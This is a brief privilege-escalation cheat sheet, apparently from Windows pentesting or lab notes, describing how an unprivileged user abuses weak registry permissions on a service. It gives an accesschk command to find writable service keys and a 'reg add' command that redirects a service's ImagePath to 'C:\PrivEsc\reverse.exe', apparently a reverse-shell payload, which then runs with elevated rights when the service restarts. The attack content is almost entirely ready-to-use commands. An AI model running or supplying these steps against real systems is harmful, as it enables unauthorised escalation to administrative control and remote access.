Insecure or Weak Registry Service Permission: [In this attack we as a normal unprivileged user can modify the Image Path of Service Executables in Registry.]

-- .\accesschk.exe /accepteula -uqvwk <Username> "HKLM\system\currentcontrolset\services" - [ This will print all services and permissions a user have access to.]

** To change the Image Path of the Registry Service Executable use the below command if changing via cmd. 

-- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

[If we have any Service Binary Path Writable then we can change that to our malicious executable which we can execute after restarting the service.]

-- Also this below shared article can be referred to exploit this mis-configuration.
